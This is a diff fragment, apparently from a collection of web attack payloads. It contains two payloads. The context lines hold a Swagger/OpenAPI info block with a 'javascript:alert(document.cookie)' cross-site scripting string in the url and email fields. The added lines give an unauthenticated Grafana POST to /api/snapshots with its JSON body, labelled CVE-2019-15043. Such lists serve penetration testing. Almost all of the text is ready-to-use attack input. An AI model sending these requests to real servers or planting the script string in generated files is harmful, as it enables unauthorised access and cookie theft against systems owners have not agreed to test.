@@ -15,3 +15,8 @@ info:
     url: "javascript:alert(document.cookie)",
     email: "javascript:alert(document.cookie)"
   version: "1.0.1"``
+
+**(CVE-2019-15043) Grafana unauthenticated API:**
+
+``POST /api/snapshots``
+``{"dashboard": {"editable":false,"hideControls":true,"nav":[{"enable":false,"type":"timepicker"}],"rows": [{}],"style":"dark","tags":[],"templating":{"list":[]},"time":{},"timezone":"browser","title":"Home","version":5},"expires": 3600}``
